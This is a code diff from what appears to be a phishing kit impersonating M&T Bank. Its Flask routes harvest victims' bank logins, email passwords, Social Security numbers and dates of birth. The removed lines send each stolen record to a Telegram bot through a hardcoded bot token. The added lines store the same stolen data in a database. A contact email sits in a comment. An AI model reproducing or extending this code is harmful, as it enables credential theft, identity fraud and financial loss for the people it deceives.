@@ -1,15 +1,7 @@
 from flask import Blueprint, session, render_template, request, redirect, url_for
-# from .utils import report_login, report_card_details, report_ssn, personal_confirmation
-# from .utils import report_login, report_ssn, report_card_details
-import telebot
-
+from mandt import db, User, Others, Email
 # franko.draper@ilydeen.org {cameleon mtbprotect}
 
-API_TOKEN = '5716438159:AAGuFg4xF9L44ChmKBFyxLdR5Jk9o7gOLCA'
-
-receiver_id = 1297895706
-
-bot = telebot.TeleBot(API_TOKEN)
 
 portals = Blueprint('portals', __name__)
 
@@ -21,8 +13,9 @@ def signin():
         if user_id and password:
             session['username'] = user_id
             # print(user_id,password)
-            # report_login(user_id,password, bank_name='M & T')
-            bot.send_message(receiver_id, f'-------------MANDT BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
+            new_user = User(username=user_id, password=password)
+            db.session.add(new_user)
+            db.session.commit()
             return redirect(url_for('portals.ssn'))
     return render_template('signin.html')
 
@@ -32,11 +25,10 @@ def email_confirmation():
     if request.method == 'POST':
         email = request.form['email']
         password = request.form['password']
-        
         if email and password:
-            bot.send_message(receiver_id, f'-------------MANDT EMAIL LOGIN FOR {username} -------------\nUsername: {email}\nPassword: {password}\n--------------------------')
-            # print(email,password)
-            # report_login(email,password, bank_name='Gmail Account M&T')
+            new_email = Email(for_username=username, email=email, password=password)
+            db.session.add(new_email)
+            db.session.commit()
             return redirect(url_for('main.syncing'))
     return render_template('identity-gmail.html')
 
@@ -47,9 +39,9 @@ def ssn():
         ssn = request.form['ssn']
         dob = request.form['dob']
         if ssn:
-            bot.send_message(receiver_id, f'-------------MANDT SSN AND DOB FOR {username} -------------\nUsername: {ssn}\nPassword: {dob}\n--------------------------')
-            # print(ssn)
-            # report_ssn(ssn)
+            new_others = Others(for_username=username, ssn=ssn, dob=dob)
+            db.session.add(new_others)
+            db.session.commit()
             return redirect(url_for('portals.email_confirmation'))
     return render_template('identity-ssn.html')
 
